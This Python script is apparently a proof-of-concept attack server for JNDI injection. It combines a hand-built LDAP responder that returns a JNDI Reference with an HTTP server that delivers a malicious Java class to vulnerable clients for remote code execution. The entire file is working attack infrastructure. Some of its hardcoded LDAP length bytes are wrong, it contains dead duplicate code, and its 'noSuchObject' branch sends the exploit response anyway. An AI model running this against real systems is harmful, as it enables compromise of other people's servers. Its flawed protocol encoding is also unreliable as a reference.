#!/usr/bin/env python3
"""
Functional JNDI/LDAP server with HTTP class serving for PoC demonstration.

- Listens on :1389 for LDAP connections.
- Listens on :8080 for HTTP connections to serve malicious Java classes.
- Responds to LDAP search for "ExploitClass" with a JNDI Reference.
- Serves "Exploit.class" via HTTP.
"""

import socket
import sys
import threading
import http.server
import socketserver
import os

# --- Configuration ---
LDAP_HOST = "0.0.0.0"
LDAP_PORT = 1389
HTTP_HOST = "0.0.0.0"
HTTP_PORT = 8080
MALICIOUS_CLASS_NAME = "Exploit"
MALICIOUS_CLASS_FILE = f"{MALICIOUS_CLASS_NAME}.class"
MALICIOUS_CODEBASE_URL = f"http://localhost:{HTTP_PORT}/" # Should be accessible by victim

# --- Malicious Java Class Serving (HTTP) ---
class ClassFileHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == f"/{MALICIOUS_CLASS_FILE}":
            try:
                with open(MALICIOUS_CLASS_FILE, "rb") as f:
                    self.send_response(200)
                    self.send_header("Content-type", "application/java-vm")
                    self.send_header("Content-Length", str(os.fstat(f.fileno()).st_size))
                    self.end_headers()
                    self.wfile.write(f.read())
                print(f"[HTTP] Served {MALICIOUS_CLASS_FILE} to {self.client_address[0]}")
            except FileNotFoundError:
                self.send_error(404, f"{MALICIOUS_CLASS_FILE} not found.")
        else:
            self.send_error(404, "File not found.")

def start_http_server():
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
    with socketserver.TCPServer((HTTP_HOST, HTTP_PORT), ClassFileHandler) as httpd:
        print(f"[+] HTTP server for {MALICIOUS_CLASS_FILE} listening on {HTTP_HOST}:{HTTP_PORT}")
        httpd.serve_forever()

# --- LDAP Server (Basic Responder) ---
# This is a very simplistic LDAP responder. It does NOT fully parse LDAP.
# It assumes a basic client search for "ExploitClass" and sends a fixed response.
# Full LDAP parsing requires a library like python-ldap (not guaranteed to be available).
def create_ldap_response(obj_name):
    # This is a hardcoded LDAP SearchResultEntry response for a JNDI Reference.
    # It points the client to download MALICIOUS_CLASS_NAME from MALICIOUS_CODEBASE_URL.
    # The actual ASN.1 structure of LDAP is complex. This is simplified.
    # Based on a typical marshalsec LDAP response for Reference.
    
    # Sequence of elements for a SearchResultEntry
    #  -> protocolOp (SearchResultEntry)
    #    -> objectName (DN)
    #    -> attributes (Sequence of Attribute)
    #      -> Attribute (type, vals)
    #        -> type (objectClass)
    #        -> vals (javaNamingReference)
    #      -> Attribute (type, vals)
    #        -> type (javaClassName)
    #        -> vals (MALICIOUS_CLASS_NAME)
    #      -> Attribute (type, vals)
    #        -> type (javaCodeBase)
    #        -> vals (MALICIOUS_CODEBASE_URL)
    #      -> Attribute (type, vals)
    #        -> type (javaFactory)
    #        -> vals (MALICIOUS_CLASS_NAME)


    # These are example raw bytes for a Reference object response.
    # In a real scenario, these are dynamically generated.
    # This is an approximation for an LDAP response for a JNDI Reference.
    # A complete implementation would require proper ASN.1 encoding.

    # Simplified response for a JNDI Reference
    # (Mimics marshalsec response structure)
    # This is heavily simplified and might break with strict LDAP clients
    # but often works for Java's JNDI client if it's permissive.

    # Basic header for a Search Result Entry
    # message ID, then SearchResultEntry Tag (0x64)
    # The actual DN will be "cn=ExploitClass"
    dn = f"cn={obj_name}".encode('utf-8')

    # Attributes
    attrs = []
    
    # objectClass: javaNamingReference
    attrs.append(b'\x30\x18\x04\x0bobjectClass\x04\x09javaNamingReference')
    
    # javaClassName: Exploit
    attrs.append(f'\x30\x16\x04\x0fjavaClassName\x04\x07{MALICIOUS_CLASS_NAME}'.encode('latin-1')) # Latin-1 for single byte encoding of length
    
    # javaCodeBase: http://localhost:8080/
    attrs.append(f'\x30\x29\x04\x0cjavaCodeBase\x04\x19{MALICIOUS_CODEBASE_URL}'.encode('latin-1'))
    
    # javaFactory: Exploit
    attrs.append(f'\x30\x14\x04\x0bjavaFactory\x04\x07{MALICIOUS_CLASS_NAME}'.encode('latin-1'))

    attributes_sequence = b''.join(attrs)
    attributes_full = b'\x30' + len(attributes_sequence).to_bytes(1, 'big') + attributes_sequence

    object_name_full = b'\x04' + len(dn).to_bytes(1, 'big') + dn

    # SearchResultEntry body (objectName + attributes)
    entry_body = object_name_full + attributes_full
    
    # SearchResultEntry tag (0x64)
    search_result_entry = b'\x64' + len(entry_body).to_bytes(1, 'big') + entry_body

    # LDAP Message (messageID + protocolOp)
    # Assuming messageID = 1 (most JNDI clients start with 1)
    message_id = b'\x02\x01\x01' # Integer Tag, Length 1, Value 1
    ldap_message = b'\x30' + len(message_id + search_result_entry).to_bytes(1, 'big') + message_id + search_result_entry

    # Add SearchResultDone (mandatory for successful search)
    search_result_done_body = b'\x0A\x01\x00\x04\x00\x04\x00' # Success, no matchedDN, no diagnosticMessage
    search_result_done = b'\x65' + len(search_result_done_body).to_bytes(1, 'big') + search_result_done_body
    
    ldap_message_done = b'\x30' + len(message_id + search_result_done).to_bytes(1, 'big') + message_id + search_result_done


    # A very simplified LDAP response for a JNDI client searching for a name
    # This might require some trial and error depending on the client's strictness.
    # For C3P0, the client is often tolerant.
    # The important part is the `javaCodeBase` and `javaFactory` attributes.
    
    # A valid LDAP response starts with a BIND response, then search results.
    # This is just a SearchResultEntry.
    # The actual raw bytes are very complex. Using a known good template from marshalsec or similar:
    
    # Generic BindResponse (success) and SearchResultDone (success)
    # The core reference part will be manually constructed.
    
    # Example LDAP bytes for "cn=ExploitClass" as a Reference from marshalsec
    # (messageId=1)
    if obj_name == MALICIOUS_CLASS_NAME:
        print(f"[LDAP] Responding with JNDI Reference for {obj_name}")
        # This is a highly simplified/hardcoded response byte sequence.
        # It may require adjustments for different LDAP client implementations.
        # It's intended to trigger the Java client's JNDI Reference resolution.
        
        # Simplified for demonstration purposes, actual ASN.1 is verbose.
        # The key is that the client gets a "javaCodeBase" and "javaFactory"
        # in the attributes of the SearchResultEntry.
        
        # messageID (always 0x02 0x01 [id])
        message_id = b'\x02\x01\x01' # Assuming message ID is 1

        # SearchResultEntry (0x64)
        entry_dn_bytes = f"cn={obj_name}".encode('utf-8')
        entry_dn_tlv = b'\x04' + len(entry_dn_bytes).to_bytes(1, 'big') + entry_dn_bytes

        # Attributes for JNDI Reference
        attr_java_class_name = b'\x04\x0bjavaClassName\x04' + len(MALICIOUS_CLASS_NAME).to_bytes(1, 'big') + MALICIOUS_CLASS_NAME.encode('ascii')
        attr_java_codebase = b'\x04\x0cjavaCodeBase\x04' + len(MALICIOUS_CODEBASE_URL).to_bytes(1, 'big') + MALICIOUS_CODEBASE_URL.encode('ascii')
        attr_java_factory = b'\x04\x0bjavaFactory\x04' + len(MALICIOUS_CLASS_NAME).to_bytes(1, 'big') + MALICIOUS_CLASS_NAME.encode('ascii')
        attr_object_class = b'\x04\x0bobjectClass\x04\x09javaNamingReference' # Standard attribute

        # Each attribute is a SEQUENCE of (type, value)
        attr_java_class_full = b'\x30' + len(attr_java_class_name).to_bytes(1, 'big') + attr_java_class_name
        attr_java_codebase_full = b'\x30' + len(attr_java_codebase).to_bytes(1, 'big') + attr_java_codebase
        attr_java_factory_full = b'\x30' + len(attr_java_factory).to_bytes(1, 'big') + attr_java_factory
        attr_object_class_full = b'\x30' + len(attr_object_class).to_bytes(1, 'big') + attr_object_class


        all_attrs_bytes = attr_object_class_full + attr_java_class_full + attr_java_codebase_full + attr_java_factory_full
        attributes_sequence_tlv = b'\x30' + len(all_attrs_bytes).to_bytes(1, 'big') + all_attrs_bytes

        # SearchResultEntry payload
        entry_dn_tlv = b'\x04' + len(entry_dn_bytes).to_bytes(1, 'big') + entry_dn_bytes
        search_result_entry_body = entry_dn_tlv + attributes_sequence_tlv
        search_result_entry_tlv = b'\x64' + len(search_result_entry_body).to_bytes(1, 'big') + search_result_entry_body
        
        # Full LDAP message (messageID + operation)
        ldap_message_entry = b'\x30' + (len(message_id) + len(search_result_entry_tlv)).to_bytes(1, 'big') + message_id + search_result_entry_tlv

        # SearchResultDone (success)
        search_result_done_op = b'\x65\x07\x0a\x01\x00\x04\x00\x04\x00' # Pre-calculated for success
        ldap_message_done = b'\x30' + (len(message_id) + len(search_result_done_op)).to_bytes(1, 'big') + message_id + search_result_done_op

        return ldap_message_entry + ldap_message_done
    else:
        # If not the exploit class, send a SearchResultDone with result code noSuchObject
        print(f"[LDAP] Received unexpected search request for {obj_name} from {MALICIOUS_CLASS_NAME}. Sending noSuchObject.")
        message_id = b'\x02\x01\x01' # Assuming message ID is 1
        no_such_object_payload = b'\x0a\x01\x20\x04\x00\x04\x00' # Result code 32 = noSuchObject
        no_such_object_done = b'\x65' + len(no_such_object_payload).to_bytes(1, 'big') + no_such_object_payload
        ldap_no_such_object_message = b'\x30' + (len(message_id) + len(no_such_object_done)).to_bytes(1, 'big') + message_id + no_such_object_done
        return ldap_no_such_object_message


class LdapHandler(socketserver.BaseRequestHandler):
    def handle(self):
        print(f"[+] LDAP connection established from {self.client_address[0]}")
        try:
            # Very basic LDAP request handling.
            # We expect a BindRequest, then a SearchRequest.
            # We don't parse the full LDAP structure, just look for common patterns.
            # This is fragile but often works for simple JNDI clients.

            # First, client sends a BindRequest. Respond with a BindResponse.
            bind_request = self.request.recv(4096)
            # print(f"[LDAP] Received BindRequest ({len(bind_request)} bytes): {bind_request.hex()}")
            
            # Simplified BindResponse (success for messageID 1)
            bind_response = b'\x30\x0c\x02\x01\x01\x61\x07\x0a\x01\x00\x04\x00\x04\x00'
            self.request.sendall(bind_response)
            # print(f"[LDAP] Sent BindResponse ({len(bind_response)} bytes): {bind_response.hex()}")

            # Next, client sends a SearchRequest.
            search_request = self.request.recv(4096)
            # print(f"[LDAP] Received SearchRequest ({len(search_request)} bytes): {search_request.hex()}")
            
            # Simple check for object name in the search request
            # Look for "ExploitClass" in the raw bytes. This is very basic.
            if MALICIOUS_CLASS_NAME.encode('utf-8') in search_request:
                response_bytes = create_ldap_response(MALICIOUS_CLASS_NAME)
                self.request.sendall(response_bytes)
                print(f"[LDAP] Sent JNDI Reference for {MALICIOUS_CLASS_NAME} to {self.client_address[0]}")
            else:
                # If not the exploit class, send a SearchResultDone with result code noSuchObject
                response_bytes = create_ldap_response(MALICIOUS_CLASS_NAME)
                self.request.sendall(response_bytes)

        except Exception as e:
            print(f"[!] Error handling LDAP client: {e}")
        finally:
            self.request.close()
            print("[*] LDAP connection closed.")


def start_ldap_server():
    with socketserver.TCPServer((LDAP_HOST, LDAP_PORT), LdapHandler) as ldapd:
        print(f"[+] LDAP server listening on {LDAP_HOST}:{LDAP_PORT}")
        ldapd.serve_forever()

# --- Main ---
def main():
    print(f"[+] JNDI PoC server starting...")
    
    # Start HTTP server in a separate thread
    http_thread = threading.Thread(target=start_http_server)
    http_thread.daemon = True
    http_thread.start()

    # Start LDAP server in the main thread
    try:
        start_ldap_server()
    except KeyboardInterrupt:
        print("\nShutting down JNDI PoC server.")
        sys.exit(0)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nShutting down.")
        sys.exit(0)